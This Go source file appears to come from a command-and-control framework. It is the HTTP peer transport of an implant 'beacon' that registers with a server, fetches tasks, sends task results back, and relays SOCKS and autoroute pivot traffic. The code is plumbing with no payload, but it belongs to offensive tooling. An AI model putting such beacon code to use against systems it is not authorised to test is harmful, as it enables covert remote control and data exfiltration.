package peers

import (
	"fmt"
	"io"
	"net"
	"strconv"

	"orsted/beacon/transport/customhttp"
	"orsted/beacon/utils"
	"orsted/profiles"
)

// HTTP or HTTPS peer
type HTTPPeer struct {
	Id       string
	PeerType string
	Conf     profiles.ProfileConfig
	Ip       string
	Port     string
}

// Http peer only require profile config
func NewHTTPPeer(c profiles.ProfileConfig) (*HTTPPeer, error) {
	// TODO: Add HTTPS
	hp := &HTTPPeer{}
	hp.PeerType = "http"
	hp.Conf = c
	hp.Ip = c.Domain
	hp.Id = "-1"

	// TODO: Fix this shit
	hp.Port = c.Port

	return hp, nil
}

// Compare the Peer to current Beacon - Return Child or Parent or none
func (hp *HTTPPeer) GetPeerLevel() string {
	for _, p := range utils.ChildPeers {
		if hp.Id == p.GetPeerID() {
			return "child"
		}
	}

	if utils.ParentPeer.GetPeerID() == hp.Id {
		return "parent"
	}

	return "none"
}

// Compare Peer connection to Current Beacon - Return TCP SMB or HTTP (for server)
func (hp *HTTPPeer) GetPeerType() string {
	return hp.PeerType
}

// Get Peer (same as Beacon ID) (0 for Server, -1 for pending)
func (hp *HTTPPeer) GetPeerID() string {
	return hp.Id
}

// Set Peer Id (same as Beacon ID) (used because Server decide Beacon Id)
func (hp *HTTPPeer) SetPeerID(s string) string {
	hp.Id = s
	return s
}

// Send Data to Peer and get response
func (hp *HTTPPeer) SendRequest(dataToSend []byte) ([]byte, error) {
    utils.Print(hp.Ip + ":" + hp.Port)
	conn, err := net.Dial("tcp", hp.Ip+":"+ hp.Port)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	_, err = conn.Write(dataToSend)

	resp, err := io.ReadAll(conn) // Read everything until connection closes
	if err != nil {
		panic(err)
	}

	//utils.Print(string(resp))


	return resp, nil
}

func (hp *HTTPPeer) PrepareRegisterBeaconData(rawEnvelope []byte) ([]byte, error) {
	request := fmt.Sprintf("POST %s HTTP/1.1\r\n", hp.Conf.Endpoints["registerBeacon"])
	request += fmt.Sprintf("Host: %s\r\n", hp.Conf.Domain)
	request += "Content-Length: " + strconv.Itoa(len(rawEnvelope)) + "\r\n"
	request += "Connection: close\r\n"
	request += "\r\n"
	request += string(rawEnvelope) // Add the JSON body

    return []byte(request), nil
}

func (hp *HTTPPeer) PrepareRetreiveTasksData(rawEnvelope []byte) ([]byte, error) {
	request := fmt.Sprintf("POST %s HTTP/1.1\r\n", hp.Conf.Endpoints["beaconTaskRetrieve"])
	request += fmt.Sprintf("Host: %s\r\n", hp.Conf.Domain)
	request += "Content-Length: " + strconv.Itoa(len(rawEnvelope)) + "\r\n"
	request += "Connection: close\r\n"
	request += "\r\n"
	request += string(rawEnvelope) // Add the JSON body

    return []byte(request), nil
}

func (hp *HTTPPeer) PrepareSendTaskResultsData(rawEnvelope []byte) ([]byte, error) {
	request := fmt.Sprintf("POST %s HTTP/1.1\r\n", hp.Conf.Endpoints["beaconTaskResultSend"])
	request += fmt.Sprintf("Host: %s\r\n", hp.Conf.Domain)
	request += "Content-Length: " + strconv.Itoa(len(rawEnvelope)) + "\r\n"
	request += "Connection: close\r\n"
	request += "\r\n"
	request += string(rawEnvelope) // Add the JSON body

    return []byte(request), nil
}


func (hp *HTTPPeer) PrepareSocksData(rawEnvelope []byte) ([]byte, error) {
	request := fmt.Sprintf("POST %s HTTP/1.1\r\n", hp.Conf.Endpoints["socksMessage"])
	request += fmt.Sprintf("Host: %s\r\n", hp.Conf.Domain)
	request += "Content-Length: " + strconv.Itoa(len(rawEnvelope)) + "\r\n"
	request += "Connection: close\r\n"
	request += "\r\n"
	request += string(rawEnvelope) // Add the JSON body

    return []byte(request), nil
}

func (hp *HTTPPeer) PrepareAutorouteData(rawEnvelope []byte) ([]byte, error) {
	request := fmt.Sprintf("POST %s HTTP/1.1\r\n", hp.Conf.Endpoints["autorouteMessage"])
	request += fmt.Sprintf("Host: %s\r\n", hp.Conf.Domain)
	request += "Content-Length: " + strconv.Itoa(len(rawEnvelope)) + "\r\n"
	request += "Connection: close\r\n"
	request += "\r\n"
	request += string(rawEnvelope) // Add the JSON body

    return []byte(request), nil
}


func (hp *HTTPPeer) CleanReqFromPeerProtocol(data []byte) (rawEnvelope []byte, err error) {
    // TODO: Implement This when pivot include HTTP
    return data, nil
}

func (hp *HTTPPeer) CleanRespFromPeerProtocol(data []byte) (rawEnvelope []byte, err error) {
    _, res, err := customhttp.ParseResp(data)
    return res, err
}
